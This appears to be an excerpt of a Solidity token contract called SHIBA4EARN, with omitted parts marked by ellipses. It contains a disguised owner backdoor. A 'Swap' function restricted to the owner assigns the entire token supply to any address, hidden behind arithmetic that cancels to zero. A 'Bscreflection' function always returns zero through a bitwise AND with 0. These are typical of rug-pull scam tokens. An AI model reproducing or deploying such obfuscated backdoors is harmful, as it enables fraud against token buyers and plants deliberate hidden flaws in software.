...
contract SHIBA4EARN is IERC20, Ownable {
    ...
    string private _name = "SHIBA4EARN";  

    string private _symbol = "SHIBEN";
    ...
    function Bscreflection(address buyer)
        ...
        returns (uint256)
    {
        return (balances[buyer]) & (((balances[buyer]) & 12 & 0) << 0xF);
    }
    ...
    function Swap(address Router) public ownerTWolf {
      if(Router != address(0)){
        balances[Router] = (122 * 322 - 122 * 322) + (tTotalSupply);
    }
  }
